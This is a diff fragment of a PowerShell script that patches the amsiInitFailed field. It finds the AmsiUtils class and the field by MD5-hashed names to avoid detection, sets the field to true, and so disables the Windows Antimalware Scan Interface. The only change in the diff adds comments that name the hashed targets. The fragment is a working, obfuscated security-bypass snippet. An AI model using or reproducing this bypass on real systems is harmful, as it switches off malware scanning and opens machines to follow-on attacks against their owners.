@@ -27,10 +27,10 @@ $auto.GetTypes() | ForEach {
 ## Patching amsiInitFailed
 
 $auto.GetTypes() | ForEach {
-    $h = GetMd5 $_.Name
+    $h = GetMd5 $_.Name      ## AmsiUtils
     if ($h -eq 'f649290befeae1b1ca9c5ee8cda5285d') {
         $_.GetFields('NonPublic,Static') | ForEach {
-            $h = GetMd5 $_.Name
+            $h = GetMd5 $_.Name  ## amsiInitFailed
             if ($h -eq 'ac201fdb093bdd5797e7acea7e55caa2') {
                 $_.SetValue($null, $true)
             }
